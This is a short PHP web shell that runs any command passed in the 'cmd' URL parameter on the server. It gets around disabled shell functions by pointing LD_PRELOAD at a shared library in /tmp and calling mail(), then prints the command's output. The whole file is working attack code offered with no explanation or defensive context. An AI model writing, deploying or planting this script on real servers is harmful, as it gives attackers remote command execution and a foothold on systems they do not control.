<?php
    $cmd = $_GET["cmd"];
    putenv("EVIL_CMDLINE=" . $cmd . " > /tmp/1.txt");

    putenv("LD_PRELOAD=/tmp/2.so");
    mail("", "", "", "");

    echo file_get_contents("/tmp/1.txt"); 
?>
